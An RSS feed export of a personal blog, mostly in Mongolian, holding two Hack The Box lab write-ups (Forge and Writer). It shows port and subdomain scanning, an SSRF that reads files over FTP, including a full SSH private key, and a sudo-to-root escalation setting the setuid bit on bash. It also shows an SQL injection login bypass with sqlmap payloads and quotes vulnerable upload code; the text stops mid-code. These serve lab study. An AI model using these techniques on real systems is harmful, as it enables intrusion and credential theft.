<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Writeup on CaDiL&#39;s Blog</title>
    <link>https://cadil.github.io/categories/writeup/</link>
    <description>Recent content in Writeup on CaDiL&#39;s Blog</description>
    <image>
      <title>CaDiL&#39;s Blog</title>
      <url>https://cadil.github.io/static</url>
      <link>https://cadil.github.io/static</link>
    </image>
    <generator>Hugo -- gohugo.io</generator>
    <language>mn</language>
    <lastBuildDate>Tue, 20 Feb 2024 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://cadil.github.io/categories/writeup/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HTB - Forge</title>
      <link>https://cadil.github.io/posts/2024-02-20-htb-forge-writeup/</link>
      <pubDate>Tue, 20 Feb 2024 00:00:00 +0000</pubDate>
      <guid>https://cadil.github.io/posts/2024-02-20-htb-forge-writeup/</guid>
      <description>HTB - Forge - Writeup</description>
      <content:encoded><![CDATA[<h3 id="1-ip-address">1. IP Address</h3>
<pre tabindex="0"><code># Machine Address
10.10.11.111

# Local Address
10.10.14.12
</code></pre><h3 id="2-nmap">2. Nmap</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sC -sV -oA nmap/forge 10.10.11.111
</span></span></code></pre></div><p>Output:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-10-30 22:18 EDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> forge.htb <span style="color:#f92672">(</span>10.10.11.111<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.22s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> closed ports
</span></span><span style="display:flex;"><span>PORT   STATE    SERVICE VERSION
</span></span><span style="display:flex;"><span>21/tcp filtered ftp
</span></span><span style="display:flex;"><span>22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open     http    Apache httpd 2.4.41
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Gallery
</span></span><span style="display:flex;"><span>Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 22.36 seconds
</span></span></code></pre></div><p><code>Bionic -&gt; 4ubuntu0.3</code></p>
<h3 id="3-gobuster">3. Gobuster</h3>
<p>Хэрэгтэй path байгаагүй:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/uploads              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 224<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://forge.htb/uploads/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/upload               <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 929<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/static               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 307<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://forge.htb/static/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/.                    <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 2050<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/server-status        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 274<span style="color:#f92672">]</span>
</span></span></code></pre></div><h3 id="4-ffuf">4. ffuf</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /opt/SecLists/Discovery/DNS/shubs-subdomains.txt -u http://forge.htb/ -H <span style="color:#e6db74">&#34;Host: FUZZ.forge.htb&#34;</span> -t <span style="color:#ae81ff">200</span> -fl <span style="color:#ae81ff">10</span>
</span></span></code></pre></div><p>admin.forge.htb:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Only localhost is allowed! 
</span></span></code></pre></div><h3 id="5-url-upload">5. URL Upload</h3>
<p><a href="http://forge.htb/uploads/Mx21C8lAyzi9AyygJDeW">http://forge.htb/uploads/Mx21C8lAyzi9AyygJDeW</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;Admin Portal&lt;/<span style="color:#f92672">title</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/css/main.css&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">header</span>&gt;
</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">nav</span>&gt;
</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/&#34;</span>&gt;Portal home&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;align-right margin-right&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/announcements&#34;</span>&gt;Announcements&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;align-right&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/upload&#34;</span>&gt;Upload image&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex;"><span>            &lt;/<span style="color:#f92672">nav</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">header</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">center</span>&gt;&lt;<span style="color:#f92672">h1</span>&gt;Welcome Admins!&lt;/<span style="color:#f92672">h1</span>&gt;&lt;/<span style="color:#f92672">center</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
</span></span></code></pre></div><p>http://ADMIN.FORGE.HTB/announcements</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;Announcements&lt;/<span style="color:#f92672">title</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/css/main.css&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/css/announcements.css&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">header</span>&gt;
</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">nav</span>&gt;
</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/&#34;</span>&gt;Portal home&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;align-right margin-right&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/announcements&#34;</span>&gt;Announcements&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;align-right&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/upload&#34;</span>&gt;Upload image&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex;"><span>            &lt;/<span style="color:#f92672">nav</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">header</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">ul</span>&gt;
</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">li</span>&gt;An internal ftp server has been setup with credentials as user:heightofsecurity123!&lt;/<span style="color:#f92672">li</span>&gt;
</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">li</span>&gt;The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.&lt;/<span style="color:#f92672">li</span>&gt;
</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">li</span>&gt;The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&amp;lt;url&amp;gt;.&lt;/<span style="color:#f92672">li</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">ul</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p><code>user</code>:<code>heightofsecurity123!</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://aDmin.forGe.hTb/upload?u<span style="color:#f92672">=</span>ftp://user:heightofsecurity123!@FORGE.HTB
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">1000</span>     <span style="color:#ae81ff">1000</span>         <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">04</span> 19:23 snap
</span></span><span style="display:flex;"><span>-rw-r-----    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">1000</span>           <span style="color:#ae81ff">33</span> Oct <span style="color:#ae81ff">30</span> 18:02 user.txt
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://aDmin.forGe.hTb/upload?u<span style="color:#f92672">=</span>ftp://user:heightofsecurity123!@FORGE.HTB/.ssh/id_rsa
</span></span></code></pre></div><p>id_rsa:</p>
<pre tabindex="0"><code>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn 
NhAAAAAwEAAQAAAYEAnZIO+Qywfgnftqo5as+orHW/w1WbrG6i6B7Tv2PdQ09NixOmtHR3 
rnxHouv4/l1pO2njPf5GbjVHAsMwJDXmDNjaqZfO9OYC7K7hr7FV6xlUWThwcKo0hIOVuE 
7Jh1d+jfpDYYXqON5r6DzODI5WMwLKl9n5rbtFko3xaLewkHYTE2YY3uvVppxsnCvJ/6uk 
r6p7bzcRygYrTyEAWg5gORfsqhC3HaoOxXiXgGzTWyXtf2o4zmNhstfdgWWBpEfbgFgZ3D 
WJ+u2z/VObp0IIKEfsgX+cWXQUt8RJAnKgTUjGAmfNRL9nJxomYHlySQz2xL4UYXXzXr8G 
mL6X0+nKrRglaNFdC0ykLTGsiGs1+bc6jJiD1ESiebAS/ZLATTsaH46IE/vv9XOJ05qEXR 
GUz+aplzDG4wWviSNuerDy9PTGxB6kR5pGbCaEWoRPLVIb9EqnWh279mXu0b4zYhEg+nyD 
K6ui/nrmRYUOadgCKXR7zlEm3mgj4hu4cFasH/KlAAAFgK9tvD2vbbw9AAAAB3NzaC1yc2 
EAAAGBAJ2SDvkMsH4J37aqOWrPqKx1v8NVm6xuouge079j3UNPTYsTprR0d658R6Lr+P5d 
aTtp4z3+Rm41RwLDMCQ15gzY2qmXzvTmAuyu4a+xVesZVFk4cHCqNISDlbhOyYdXfo36Q2 
GF6jjea+g8zgyOVjMCypfZ+a27RZKN8Wi3sJB2ExNmGN7r1aacbJwryf+rpK+qe283EcoG 
K08hAFoOYDkX7KoQtx2qDsV4l4Bs01sl7X9qOM5jYbLX3YFlgaRH24BYGdw1ifrts/1Tm6 
dCCChH7IF/nFl0FLfESQJyoE1IxgJnzUS/ZycaJmB5ckkM9sS+FGF1816/Bpi+l9Ppyq0Y 
JWjRXQtMpC0xrIhrNfm3OoyYg9REonmwEv2SwE07Gh+OiBP77/VzidOahF0RlM/mqZcwxu 
MFr4kjbnqw8vT0xsQepEeaRmwmhFqETy1SG/RKp1odu/Zl7tG+M2IRIPp8gyurov565kWF 
DmnYAil0e85RJt5oI+IbuHBWrB/ypQAAAAMBAAEAAAGALBhHoGJwsZTJyjBwyPc72KdK9r 
rqSaLca+DUmOa1cLSsmpLxP+an52hYE7u9flFdtYa4VQznYMgAC0HcIwYCTu4Qow0cmWQU 
xW9bMPOLe7Mm66DjtmOrNrosF9vUgc92Vv0GBjCXjzqPL/p0HwdmD/hkAYK6YGfb3Ftkh0
2AV6zzQaZ8p0WQEIQN0NZgPPAnshEfYcwjakm3rPkrRAhp3RBY5m6vD9obMB/DJelObF98
yv9Kzlb5bDcEgcWKNhL1ZdHWJjJPApluz6oIn+uIEcLvv18hI3dhIkPeHpjTXMVl9878F+
kHdcjpjKSnsSjhlAIVxFu3N67N8S3BFnioaWpIIbZxwhYv9OV7uARa3eU6miKmSmdUm1z/
wDaQv1swk9HwZlXGvDRWcMTFGTGRnyetZbgA9vVKhnUtGqq0skZxoP1ju1ANVaaVzirMeu
DXfkpfN2GkoA/ulod3LyPZx3QcT8QafdbwAJ0MHNFfKVbqDvtn8Ug4/yfLCueQdlCBAAAA
wFoM1lMgd3jFFi0qgCRI14rDTpa7wzn5QG0HlWeZuqjFMqtLQcDlhmE1vDA7aQE6fyLYbM
0sSeyvkPIKbckcL5YQav63Y0BwRv9npaTs9ISxvrII5n26hPF8DPamPbnAENuBmWd5iqUf
FDb5B7L+sJai/JzYg0KbggvUd45JsVeaQrBx32Vkw8wKDD663agTMxSqRM/wT3qLk1zmvg
NqD51AfvS/NomELAzbbrVTowVBzIAX2ZvkdhaNwHlCbsqerAAAAMEAzRnXpuHQBQI3vFkC
9vCV+ZfL9yfI2gz9oWrk9NWOP46zuzRCmce4Lb8ia2tLQNbnG9cBTE7TARGBY0QOgIWy0P
fikLIICAMoQseNHAhCPWXVsLL5yUydSSVZTrUnM7Uc9rLh7XDomdU7j/2lNEcCVSI/q1vZ
dEg5oFrreGIZysTBykyizOmFGElJv5wBEV5JDYI0nfO+8xoHbwaQ2if9GLXLBFe2f0BmXr
W/y1sxXy8nrltMVzVfCP02sbkBV9JZAAAAwQDErJZn6A+nTI+5g2LkofWK1BA0X79ccXeL
wS5q+66leUP0KZrDdow0s77QD+86dDjoq4fMRLl4yPfWOsxEkg90rvOr3Z9ga1jPCSFNAb
RVFD+gXCAOBF+afizL3fm40cHECsUifh24QqUSJ5f/xZBKu04Ypad8nH9nlkRdfOuh2jQb
nR7k4+Pryk8HqgNS3/g1/Fpd52DDziDOAIfORntwkuiQSlg63hF3vadCAV3KIVLtBONXH2
shlLupso7WoS0AAAAKdXNlckBmb3JnZQE=
-----END OPENSSH PRIVATE KEY-----
</code></pre><p>User:</p>
<pre tabindex="0"><code>16eeaf74*************
</code></pre><h3 id="6-enumeration">6. Enumeration</h3>
<p><code>sudo -l</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>User user may run the following commands on forge:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
</span></span></code></pre></div><p><code>remote-manage.py</code> - ашиглах боломжтой. Порт listen хийж байгаад <code>&lt;pdb&gt;</code> руу орохын тулд шинэ терминал сешн нээгээд ssh дахин нэвтрээд <code>nc localhost &lt;port&gt;</code> listen хийнэ. Эхний терминал сешн дээрээс <code>pdb</code> руу юу ч хамаагүй бичээд орно.</p>
<h3 id="7-exploitation">7. Exploitation</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>import os
</span></span><span style="display:flex;"><span>os.system <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;chmod u+s /bin/bash&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>exit
</span></span></code></pre></div><p>Root руу орохдоо:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/bin/bash -p
</span></span></code></pre></div>]]></content:encoded>
    </item>
    <item>
      <title>HTB - Winter</title>
      <link>https://cadil.github.io/posts/2024-02-17-htb-winter-writeup/</link>
      <pubDate>Sat, 17 Feb 2024 00:00:00 +0000</pubDate>
      <guid>https://cadil.github.io/posts/2024-02-17-htb-winter-writeup/</guid>
      <description>HTB - Winter - Writeup</description>
      <content:encoded><![CDATA[<h3 id="1-ip-address">1. IP Address</h3>
<pre tabindex="0"><code># Machine Address
10.10.11.101

# Local Address
10.10.14.31
</code></pre><h3 id="2-nmap">2. Nmap</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sC -sV -oA nmap/writer 10.10.11.101
</span></span></code></pre></div><pre tabindex="0"><code># Nmap 7.91 scan initiated Fri Sep  3 10:52:33 2021 as: nmap -sC -sV -oA nmap/writer 10.10.11.101
Nmap scan report for 10.10.11.101
Host is up (0.21s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Story Bank | Writer.HTB
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 13m54s
|_nbstat: NetBIOS name: WRITER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-03T15:06:47
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep  3 10:52:58 2021 -- 1 IP address (1 host up) scanned in 25.18 seconds
</code></pre><h3 id="3-gobuster">3. Gobuster</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://10.10.11.101 -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobuster.out
</span></span></code></pre></div><pre tabindex="0"><code>/contact              (Status: 200) [Size: 4905]
/logout               (Status: 302) [Size: 208] [--&gt; http://10.10.11.101/]
/about                (Status: 200) [Size: 3522]
/static               (Status: 301) [Size: 313] [--&gt; http://10.10.11.101/static/]
/.                    (Status: 200) [Size: 11976]
/dashboard            (Status: 302) [Size: 208] [--&gt; http://10.10.11.101/]
/server-status        (Status: 403) [Size: 277]
/administrative       (Status: 200) [Size: 1443]
</code></pre><p><code>administrative</code></p>
<h3 id="4-sqlmap">4. SQLMap</h3>
<p>SQL Injection үзсэн, логин хийгээгүй:</p>
<pre tabindex="0"><code>&#39;or 1=1 -- -
</code></pre><p>Тэхээр нь Burp логин хийж байгаа хүсэлтийг файл хэлбэрээр хадаглах:</p>
<pre tabindex="0"><code class="language-login.req" data-lang="login.req">POST /administrative HTTP/1.1
Host: 10.10.11.101
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://10.10.11.101
DNT: 1
Connection: close
Referer: http://10.10.11.101/administrative
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

uname=admin&amp;password=admin
</code></pre><p>Терминал:</p>
<pre tabindex="0"><code>sqlmap -r login.req --level 5 --risk 3 --threads 10
</code></pre><p>Үр дүн:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span>Parameter: uname <span style="color:#f92672">(</span>POST<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    Type: boolean-based blind
</span></span><span style="display:flex;"><span>    Title: OR boolean-based blind - WHERE or HAVING clause
</span></span><span style="display:flex;"><span>    Payload: uname<span style="color:#f92672">=</span>-1182<span style="color:#960050;background-color:#1e0010">&#39;</span> OR 8638<span style="color:#f92672">=</span>8638-- ITHB&amp;password<span style="color:#f92672">=</span>admin
</span></span><span style="display:flex;"><span>---
</span></span></code></pre></div><p>Testing</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -r login.req --dump-all
</span></span></code></pre></div><p>Цаашаа уншаад хэрэгтэй зүйл буцаагаагүй. Хэрэгтэй output-г аваад логин хийж орсон.</p>
<h3 id="5-image-upload">5. Image Upload</h3>
<p><strong>init</strong>.py</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;image_url&#39;</span>):
</span></span><span style="display:flex;"><span>	    image_url <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;image_url&#39;</span>)
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;.jpg&#34;</span> <span style="color:#f92672">in</span> image_url:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>		    local_filename, headers <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>urlretrieve(image_url)
</span></span><span style="display:flex;"><span>		    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;mv </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.jpg&#34;</span><span style="color:#f92672">.</span>format(local_filename, local_filename))
</span></span><span style="display:flex;"><span>		    image <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.jpg&#34;</span><span style="color:#f92672">.</span>format(local_filename)
</span></span><span style="display:flex;"><span>		    <span style="color:#66d9ef">try</span>:
